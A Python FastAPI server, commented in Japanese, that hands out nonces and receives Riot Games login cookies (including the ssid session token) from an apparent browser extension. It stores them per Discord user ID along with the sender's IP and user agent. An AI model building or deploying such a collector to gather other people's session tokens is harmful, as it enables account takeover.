from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware
import time, secrets, re, os, logging

from .services.cookiesDB import save_cookies

# ---- ログ設定（INFO以上を出力）----
logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

app = FastAPI()

# CORS（拡張からのfetch想定。allow_originsは本番で絞るのが安全）
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],        # 例: ["https://pure-cherrita-inosuke-6597cf0f.koyeb.app"]
    allow_credentials=False,    # "*" と True は両立しないため False 推奨
    allow_methods=["*"],
    allow_headers=["*"],
)

_nonces = {}

@app.get("/nonce")
def nonce():
    n = secrets.token_urlsafe(24)
    _nonces[n] = time.time() + 180
    return {"nonce": n, "expiry": 180}

@app.post("/riot-cookies")
async def receive(req: Request):
    data = await req.json()

    # --- Nonce 検証 ---
    n = data.get("nonce")
    if not n or n not in _nonces or _nonces[n] < time.time():
        return JSONResponse({"ok": False, "error": "invalid_or_expired_nonce"}, status_code=400)
    del _nonces[n]

    # --- Discord ユーザーID検証（数字のみ 5〜25桁を許容）---
    user_id = str(data.get("user_id", "")).strip()
    if not re.fullmatch(r"\d{5,25}", user_id):
        return JSONResponse({"ok": False, "error": "invalid_user_id"}, status_code=400)

    # --- 保存する JSON を構築 ---
    cookies = data.get("cookies", {}) or {}
    a = cookies.get("auth", {}) or {}

    cookie_json = {
        "ssid": a.get("ssid"),
        "clid": a.get("clid"),
        "sub": a.get("sub"),
        "csid": a.get("csid"),
        "tdid": a.get("tdid"),
        "puuid": cookies.get("puuid"),
    }

    user_agent = req.headers.get("user-agent")
    last_ip = req.client.host if req.client else None
    save_cookies(user_id, cookie_json, user_agent=user_agent, last_ip=last_ip)

    log.info("Saved cookies for user_id=%s", user_id)

    return {"ok": True}

# 任意：ヘルスチェック用
@app.get("/")
def root():
    return {"ok": True, "hint": "use /nonce or /riot-cookies"}

if __name__ == "__main__":
    import uvicorn
    port = int(os.getenv("PORT", "8190"))  # Koyebなら PORT を使う
    uvicorn.run(app, host="0.0.0.0", port=port)
